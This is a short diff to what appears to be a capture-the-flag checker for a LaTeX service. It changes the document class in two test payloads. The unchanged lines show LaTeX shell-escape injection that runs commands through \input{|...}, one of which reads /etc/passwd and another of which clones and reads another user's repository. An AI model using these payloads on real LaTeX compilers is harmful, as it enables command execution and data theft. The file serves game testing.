@@ -102,7 +102,7 @@ async def havoc_test_git(task: HavocCheckerTaskMessage, client: AsyncClient, db:
 @checker.havoc(1)
 async def havoc_test_latex(task: HavocCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
     (username, password, _, id) = await create_user_and_project(client, db, logger)
-    file_content = """\\documentclass[12pt]{scrartcl}
+    file_content = """\\documentclass[12pt]{minimal}
 \\usepackage{verbatim}
 \\begin{document}
     \\input{|"echo XGJlZ2lue3ZlcmJhdGltfQ== | base64 --decode; cat /etc/passwd ; echo XGVuZHt2ZXJiYXRpbX0= | base64 --decode"}
@@ -166,7 +166,7 @@ async def exploit_one(task: ExploitCheckerTaskMessage, client: AsyncClient, sear
 
     commands = f"git clone http://nginx-git/{f_id}; cat ./{f_id}/main.tex"
 
-    file_content = """\\documentclass[12pt]{scrartcl}
+    file_content = """\\documentclass[12pt]{minimal}
 \\usepackage{verbatim}
 \\begin{document}
     \\input{|"echo XGJlZ2lue3ZlcmJhdGltfQ== | base64 --decode;""" + commands + """; echo XGVuZHt2ZXJiYXRpbX0= | base64 --decode"}
